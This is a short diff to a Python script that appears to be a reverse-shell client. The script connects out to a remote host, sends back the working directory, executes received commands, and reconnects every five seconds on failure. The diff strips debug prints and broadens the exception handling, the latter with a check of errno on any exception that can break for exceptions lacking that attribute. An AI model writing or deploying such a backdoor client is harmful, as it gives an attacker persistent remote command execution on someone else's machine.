@@ -1,4 +1,4 @@
-import os
+import os, errno
 import socket
 import subprocess
 import time
@@ -10,9 +10,7 @@ def receive_commands():
     """
     while True:
 
-        print("A primit data")
         data = s.recv(1024)
-        print(data)
         """In the case of the 'cd' shell command, change the directory path to the new one
         """
         if data[:3].decode("utf-8") == 'cd ':
@@ -93,7 +91,9 @@ def connect_to_server():
         s.connect((host, port))
         s.send(str.encode(os.getcwd() + '> '))
         receive_commands()
-    except (ConnectionRefusedError, ConnectionResetError, ConnectionAbortedError):
+    except Exception as e:
+        if e.errno == errno.EPIPE:
+            pass
         time.sleep(5)
         connect_to_server()
 
